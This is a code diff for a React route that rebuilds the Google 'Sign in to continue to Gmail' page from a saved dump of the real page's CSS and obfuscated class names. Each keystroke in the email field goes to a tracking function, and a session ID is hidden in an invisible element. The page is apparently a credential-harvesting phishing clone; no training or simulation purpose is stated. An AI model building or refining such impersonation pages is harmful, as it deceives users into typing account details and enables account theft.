@@ -1,15 +1,11 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useRef, useState } from "react";
 import {
-  GE_CARD_BG,
-  GE_FONT_FAMILY,
-  GE_ON_PRIMARY,
-  GE_PAGE_BG,
-  GE_PRIMARY,
   GeFontStyle,
   GoogleGLogo,
   useGeTracking,
 } from "@/components/ge/GeShared";
+import signinHtml from "@/designs/ge/signin.html?raw";
 
 export const Route = createFileRoute("/ge/signin")({
   head: () => ({
@@ -21,326 +17,20 @@ export const Route = createFileRoute("/ge/signin")({
   component: GeSignInPage,
 });
 
-const GE_SIGNIN_CSS = `
-.ge-signin-page {
-  --gm3-page: ${GE_PAGE_BG};
-  --gm3-card: ${GE_CARD_BG};
-  --gm3-on-surface: #e3e3e3;
-  --gm3-on-surface-variant: #c4c7c5;
-  --gm3-outline: #8e918f;
-  --gm3-primary: ${GE_PRIMARY};
-  --gm3-on-primary: ${GE_ON_PRIMARY};
-  --font-sans: ${GE_FONT_FAMILY};
-  --c-ps-s: 24px;
-  --c-ps-e: 24px;
-  --wf-gutw: 24px;
-  box-sizing: border-box;
-  margin: 0;
-  min-height: 100vh;
-  background: var(--gm3-page);
-  color: var(--gm3-on-surface);
-  font-family: var(--font-sans);
-  font-size: 0.875rem;
-  line-height: 1.4286;
-  -webkit-font-smoothing: antialiased;
-  color-scheme: dark;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: flex-start;
-  padding: 24px 16px 24px;
+/** Exact CSS from the user's SingleFile dump recreation (designs/ge/signin.html). */
+function extractCss(html: string): string {
+  const m = html.match(/<style>([\s\S]*?)<\/style>/i);
+  let css = m?.[1] ?? "";
+  // Dump scopes dark tokens to body.AfoeCd — apply them to the React page root.
+  css = css.replace(/body\.AfoeCd/g, "html, body, .S7xv8");
+  css = css.replace(
+    /html,\s*body\s*\{/,
+    "html, body { color-scheme: dark !important;",
+  );
+  return css;
 }
-.ge-signin-page *, .ge-signin-page *::before, .ge-signin-page *::after { box-sizing: border-box; }
-@media (min-width: 840px) {
-  .ge-signin-page {
-    padding: 48px 24px 24px;
-    justify-content: center;
-  }
-}
-.ge-signin-page .card {
-  background: var(--gm3-card);
-  width: 100%;
-  max-width: 480px;
-  border-radius: 28px;
-  padding: 36px 24px;
-  min-height: 528px;
-  display: flex;
-  flex-direction: column;
-  position: relative;
-}
-@media (min-width: 600px) {
-  .ge-signin-page .card {
-    width: 480px;
-    max-width: 480px;
-    padding: 40px 40px 36px;
-  }
-}
-@media (min-width: 900px) {
-  .ge-signin-page {
-    --c-ps-s: 36px;
-    --c-ps-e: 36px;
-    --wf-gutw: 38px;
-  }
-  .ge-signin-page .card {
-    width: 1040px;
-    max-width: min(1040px, calc(100vw - 48px));
-    min-height: 400px;
-    padding: 36px var(--c-ps-e) 36px var(--c-ps-s);
-    flex-direction: row;
-    flex-wrap: wrap;
-    align-items: stretch;
-  }
-  .ge-signin-page .pane-left,
-  .ge-signin-page .pane-right {
-    flex: 1 1 50%;
-    max-width: 50%;
-    min-width: 0;
-    display: flex;
-    flex-direction: column;
-  }
-  .ge-signin-page .pane-left { padding-right: var(--wf-gutw); }
-  .ge-signin-page .pane-right { padding-left: var(--wf-gutw); }
-  .ge-signin-page .form-area { margin-top: 0; }
-}
-@media (min-width: 900px) and (max-width: 1199px) {
-  .ge-signin-page .card {
-    width: 840px;
-    max-width: min(840px, calc(100vw - 48px));
-  }
-}
-.ge-signin-page .logo { display: block; width: 40px; height: 48px; margin: 0; flex-shrink: 0; }
-.ge-signin-page h1 {
-  margin: 16px 0 0;
-  font-family: var(--font-sans);
-  font-weight: 400;
-  font-size: 2rem;
-  line-height: 1.25;
-  color: var(--gm3-on-surface);
-}
-@media (min-width: 840px) {
-  .ge-signin-page h1 { font-size: 2.25rem; line-height: 1.222; }
-}
-.ge-signin-page .subtitle {
-  margin: 16px 0 0;
-  font-size: 1rem;
-  line-height: 1.5;
-  font-weight: 400;
-  color: var(--gm3-on-surface);
-}
-.ge-signin-page .form-area {
-  margin-top: 24px;
-  flex: 1;
-  display: flex;
-  flex-direction: column;
-}
-.ge-signin-page .field {
-  position: relative;
-  width: 100%;
-  height: 56px;
-  margin-top: 8px;
-}
-.ge-signin-page .field input {
-  position: relative;
-  z-index: 1;
-  width: 100%;
-  height: 56px;
-  margin: 0;
-  padding: 13px 15px;
-  border: none;
-  outline: none;
-  background: transparent;
-  color: var(--gm3-on-surface);
-  font-family: var(--font-sans);
-  font-size: 1rem;
-  font-weight: 400;
-  line-height: 1.5;
-  caret-color: var(--gm3-primary);
-}
-.ge-signin-page .field .outline {
-  position: absolute;
-  inset: 0;
-  border: 1px solid var(--gm3-outline);
-  border-radius: 4px;
-  pointer-events: none;
-  transition: border-color .15s cubic-bezier(.4,0,.2,1);
-}
-.ge-signin-page .field .outline-focus {
-  position: absolute;
-  inset: 0;
-  border: 2px solid var(--gm3-primary);
-  border-radius: 4px;
-  pointer-events: none;
-  opacity: 0;
-  transition: opacity .15s cubic-bezier(.4,0,.2,1);
-}
-.ge-signin-page .field label {
-  position: absolute;
-  left: 8px;
-  bottom: 17px;
-  padding: 0 8px;
-  max-width: calc(100% - 16px);
-  color: var(--gm3-on-surface-variant);
-  background: var(--gm3-card);
-  font-family: var(--font-sans);
-  font-size: 1rem;
-  font-weight: 400;
-  line-height: 1.5;
-  pointer-events: none;
-  white-space: nowrap;
-  overflow: hidden;
-  text-overflow: ellipsis;
-  transform-origin: left center;
-  transition: transform .15s cubic-bezier(.4,0,.2,1), color .15s cubic-bezier(.4,0,.2,1);
-  z-index: 2;
-}
-.ge-signin-page .field:focus-within .outline-focus { opacity: 1; }
-.ge-signin-page .field:focus-within .outline { border-color: transparent; }
-.ge-signin-page .field:focus-within label {
-  color: var(--gm3-primary);
-  transform: translateY(-29px) scale(0.75);
-}
-.ge-signin-page .field.has-value label {
-  transform: translateY(-29px) scale(0.75);
-}
-.ge-signin-page .field:focus-within input { padding: 12px 14px; }
-.ge-signin-page .forgot {
-  margin: 9px 0 0;
-  padding: 0;
-  border: 0;
-  background: none;
-  color: var(--gm3-primary);
-  font-family: var(--font-sans);
-  font-size: 0.875rem;
-  font-weight: 500;
-  letter-spacing: 0.015625rem;
-  line-height: 1.4286;
-  cursor: pointer;
-  text-align: left;
-}
-.ge-signin-page .forgot:hover { text-decoration: underline; }
-.ge-signin-page .guest {
-  margin-top: 32px;
-  color: var(--gm3-on-surface-variant);
-  font-family: var(--font-sans);
-  font-size: 0.875rem;
-  font-weight: 400;
-  line-height: 1.4286;
-}
-.ge-signin-page .guest a {
-  color: var(--gm3-primary);
-  font-weight: 500;
-  text-decoration: none;
-  letter-spacing: 0.015625rem;
-}
-.ge-signin-page .guest a:hover { text-decoration: underline; }
-.ge-signin-page .actions {
-  display: flex;
-  flex-direction: row-reverse;
-  flex-wrap: wrap;
-  align-items: center;
-  justify-content: space-between;
-  margin-top: auto;
-  padding-top: 32px;
-  gap: 8px;
-  width: 100%;
-}
-.ge-signin-page .btn {
-  display: inline-flex;
-  align-items: center;
-  justify-content: center;
-  height: 40px;
-  min-width: 64px;
-  padding: 0 24px;
-  border: none;
-  border-radius: 20px;
-  font-family: var(--font-sans);
-  font-size: 0.875rem;
-  font-weight: 500;
-  line-height: 1.4286;
-  cursor: pointer;
-  user-select: none;
-}
-.ge-signin-page .btn-filled {
-  background: var(--gm3-primary);
-  color: var(--gm3-on-primary);
-}
-.ge-signin-page .btn-filled:hover:not(:disabled) {
-  box-shadow: 0 1px 2px 0 rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
-  filter: brightness(1.06);
-}
-.ge-signin-page .btn-filled:disabled {
-  opacity: 0.38;
-  cursor: default;
-  box-shadow: none;
-  filter: none;
-}
-.ge-signin-page .btn-text {
-  background: transparent;
-  color: var(--gm3-primary);
-  padding: 0 12px;
-}
-.ge-signin-page .btn-text:hover { background: rgba(168, 199, 250, 0.08); }
-.ge-signin-page .footer {
-  display: flex;
-  flex-wrap: wrap;
-  align-items: center;
-  justify-content: space-between;
-  width: 100%;
-  max-width: 480px;
-  margin-top: 16px;
-  padding: 0 4px;
-  gap: 8px;
-}
-@media (min-width: 900px) and (max-width: 1199px) {
-  .ge-signin-page .footer { max-width: min(840px, calc(100vw - 48px)); }
-}
-@media (min-width: 1200px) {
-  .ge-signin-page .footer { max-width: min(1040px, calc(100vw - 48px)); }
-}
-.ge-signin-page .lang {
-  appearance: none;
-  -webkit-appearance: none;
-  border: 0;
-  color: var(--gm3-on-surface);
-  font-family: var(--font-sans);
-  font-size: 0.75rem;
-  line-height: 1.333;
-  padding: 8px 28px 8px 12px;
-  border-radius: 8px;
-  cursor: pointer;
-  background-color: transparent;
-  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23c4c7c5' d='M1.41 0L6 4.58 10.59 0 12 1.41l-6 6-6-6z'/%3E%3C/svg%3E");
-  background-repeat: no-repeat;
-  background-position: right 10px center;
-}
-.ge-signin-page .lang:hover { background-color: rgba(227, 227, 227, 0.08); }
-.ge-signin-page .lang option {
-  background: #282a2c;
-  color: var(--gm3-on-surface);
-}
-.ge-signin-page .footer-links {
-  display: flex;
-  list-style: none;
-  margin: 0;
-  padding: 0;
-  gap: 0;
-}
-.ge-signin-page .footer-links a {
-  display: flex;
-  align-items: center;
-  color: var(--gm3-on-surface);
-  font-family: var(--font-sans);
-  font-size: 0.75rem;
-  font-weight: 400;
-  letter-spacing: 0.00625rem;
-  line-height: 1.333;
-  text-decoration: none;
-  padding: 8px 12px;
-  border-radius: 8px;
-}
-.ge-signin-page .footer-links a:hover { background: rgba(227, 227, 227, 0.08); }
-html, body { background: ${GE_PAGE_BG} !important; color-scheme: dark; }
-`;
+
+const GE_SIGNIN_CSS = extractCss(signinHtml);
 
 function GeSignInPage() {
   const { trackClick, trackInput, trackSubmit, geNavigate, sessionId, isObserve } =
@@ -382,111 +72,142 @@ function GeSignInPage() {
   };
 
   return (
-    <div className="ge-signin-page">
+    <>
       <GeFontStyle />
       <style>{GE_SIGNIN_CSS}</style>
-
-      <main className="card" role="main">
-        <div className="pane-left">
-          <GoogleGLogo className="logo" width={48} height={48} />
-          <h1>Sign in</h1>
-          <p className="subtitle">to continue to Gmail</p>
-        </div>
-
-        <div className="pane-right">
-          <form className="form-area" onSubmit={handleNext} autoComplete="off">
-            <div className={`field${email ? " has-value" : ""}`}>
-              <input
-                ref={emailRef}
-                type="email"
-                id="identifierId"
-                name="email"
-                autoComplete="username"
-                spellCheck={false}
-                autoCapitalize="none"
-                aria-label="Email or phone"
-                placeholder=" "
-                value={email}
-                onChange={(e) => {
-                  const v = e.target.value;
-                  setEmail(v);
-                  trackInput("email", v);
-                }}
-              />
-              <div className="outline" aria-hidden="true" />
-              <div className="outline-focus" aria-hidden="true" />
-              <label htmlFor="identifierId">Email or phone</label>
+      <div className="S7xv8">
+        <div className="TcuCfd NQ5OL">
+          <main className="Svhjgc">
+            <div className="zIgDIc">
+              <div className="Wf6lSd">
+                <GoogleGLogo width={48} height={48} />
+              </div>
+              <div className="ObDc3">
+                <h1 className="vAV9bf">Sign in</h1>
+                <div className="gNJDp">to continue to Gmail</div>
+              </div>
             </div>
 
-            <button
-              type="button"
-              className="forgot"
-              onClick={() => trackClick("Forgot email?")}
-            >
-              Forgot email?
-            </button>
-
-            <p className="guest">
-              Not your computer? Use Guest mode to sign in privately.{" "}
-              <a
-                href="https://support.google.com/chrome/answer/6130773?hl=en"
-                target="_blank"
-                rel="noopener noreferrer"
+            <div className="UXFQgc">
+              <form
+                className="qWK5J"
+                onSubmit={handleNext}
+                autoComplete="off"
+                style={{ display: "flex", flexDirection: "column", flexGrow: 1 }}
               >
-                Learn more about using Guest mode
-              </a>
-            </p>
+                <div className={`field${email ? " has-value" : ""}`} id="emailField">
+                  <input
+                    ref={emailRef}
+                    id="identifierId"
+                    name="email"
+                    type="email"
+                    autoComplete="username"
+                    spellCheck={false}
+                    autoCapitalize="none"
+                    aria-label="Email or phone"
+                    value={email}
+                    onChange={(e) => {
+                      const v = e.target.value;
+                      setEmail(v);
+                      trackInput("email", v);
+                    }}
+                  />
+                  <label className="AxOyFc snByac" htmlFor="identifierId">
+                    Email or phone
+                  </label>
+                  <div className="outline mIZh1c" aria-hidden="true" />
+                  <div className="outline-focus cXrdqd" aria-hidden="true" />
+                </div>
 
-            <div className="actions">
-              <button type="submit" className="btn btn-filled" disabled={!canContinue}>
-                Next
-              </button>
-              <button
-                type="button"
-                className="btn btn-text"
-                onClick={() => trackClick("Create account")}
-              >
-                Create account
-              </button>
+                <div className="dMNVAe">
+                  <button
+                    type="button"
+                    className="linkish"
+                    onClick={() => trackClick("Forgot email?")}
+                  >
+                    Forgot email?
+                  </button>
+                </div>
+
+                <div className="RDsYTb">
+                  Not your computer? Use Guest mode to sign in privately.{" "}
+                  <a
+                    href="https://support.google.com/chrome/answer/6130773?hl=en"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                  >
+                    Learn more about using Guest mode
+                  </a>
+                </div>
+
+                <div className="JYXaTc">
+                  <div className="O1Slxf">
+                    <div className="TNTaPb">
+                      <button
+                        type="submit"
+                        className="btn btn-next AjY5Oe Jskylb"
+                        disabled={!canContinue}
+                      >
+                        Next
+                      </button>
+                    </div>
+                    <div className="FO2vFd">
+                      <button
+                        type="button"
+                        className="btn btn-create lKxP2d eR0mzb"
+                        onClick={() => trackClick("Create account")}
+                      >
+                        Create account
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </form>
             </div>
-          </form>
+          </main>
         </div>
-      </main>
 
-      <footer className="footer">
-        <select className="lang" aria-label="Change language" defaultValue="en-US">
-          <option value="en-US">English (United States)</option>
-          <option value="es">Español (España)</option>
-          <option value="fr">Français (France)</option>
-          <option value="de">Deutsch</option>
-          <option value="ja">日本語</option>
-        </select>
-        <ul className="footer-links">
-          <li>
-            <a href="https://support.google.com/accounts?hl=en" target="_blank" rel="noopener noreferrer">
-              Help
-            </a>
-          </li>
-          <li>
-            <a
-              href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true"
-              target="_blank"
-              rel="noopener noreferrer"
-            >
-              Privacy
-            </a>
-          </li>
-          <li>
-            <a href="https://accounts.google.com/TOS?loc=US&hl=en" target="_blank" rel="noopener noreferrer">
-              Terms
-            </a>
-          </li>
-        </ul>
-      </footer>
-
+        <div className="wmGw4">
+          <footer className="FZfKCe">
+            <div className="lang">English (United States)</div>
+            <ul className="HwzH1e">
+              <li className="qKvP1b">
+                <a
+                  className="AVAq4d"
+                  href="https://support.google.com/accounts?hl=en"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  Help
+                </a>
+              </li>
+              <li className="qKvP1b">
+                <a
+                  className="AVAq4d"
+                  href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  Privacy
+                </a>
+              </li>
+              <li className="qKvP1b">
+                <a
+                  className="AVAq4d"
+                  href="https://accounts.google.com/TOS?loc=US&hl=en"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  Terms
+                </a>
+              </li>
+            </ul>
+          </footer>
+        </div>
+      </div>
       <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
         {sessionId}
       </div>
-    </div>
+    </>
   );
 }
